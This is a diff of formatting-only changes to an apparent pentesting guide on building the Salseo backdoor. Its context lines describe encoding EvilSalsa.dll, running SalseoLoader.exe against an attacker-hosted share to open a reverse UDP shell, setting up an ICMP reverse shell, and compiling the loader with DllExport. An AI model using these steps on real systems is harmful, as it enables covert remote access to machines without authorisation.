@@ -12,7 +12,7 @@ Compile those projects for the architecture of the windows box where your are go
 
 You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
 
-**(**If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+**(**If you can't find this options press in **"Project Tab" **and then in **"\<Project Name> Properties"**)
 
 ![](../.gitbook/assets/image.png)
 
@@ -22,7 +22,7 @@ Then, build both projects (Build -> Build Solution) (Inside the logs will appear
 
 ## Prepare the Backdoor
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**
+First of all, you will need to encode the **EvilSalsa.dll. **To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**
 
 ### **Python**
 
@@ -62,7 +62,7 @@ SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <A
 
 ### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)****
+**This time you need a special tool in the client to receive the reverse shell. Download: **[**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)****
 
 #### **Disable ICMP Replies:**
 
@@ -95,7 +95,7 @@ Open the SalseoLoader project using Visual Studio.
 
 ### Install DllExport for this project
 
-#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
+#### **Tools** --> **NuGet Package Manager **--> **Manage NuGet Packages for Solution...**
 
 ![](<../.gitbook/assets/image (3).png>)
 
@@ -103,27 +103,27 @@ Open the SalseoLoader project using Visual Studio.
 
 ![](<../.gitbook/assets/image (4).png>)
 
-In your project folder have appeared the files: **DllExport.bat** and **DllExport\_Configure.bat**
+In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**
 
 ### **U**ninstall DllExport
 
-Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+Press **Uninstall **(yeah, its weird but trust me, it is necessary)
 
 ![](<../.gitbook/assets/image (5).png>)
 
-### **Exit Visual Studio and execute DllExport\_configure**
+### **Exit Visual Studio and execute DllExport_configure**
 
 Just **exit** Visual Studio
 
-Then, go to your **SalseoLoader folder** and **execute DllExport\_Configure.bat**
+Then, go to your **SalseoLoader folder **and **execute DllExport_Configure.bat**
 
-Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices **(inside **Namespace for DllExport**) and press **Apply**
 
 ![](<../.gitbook/assets/image (7).png>)
 
 ### **Open the project again with visual Studio**
 
-**\[DllExport]** should not be longer marked as error
+**\[DllExport] **should not be longer marked as error
 
 ![](<../.gitbook/assets/image (8).png>)
 
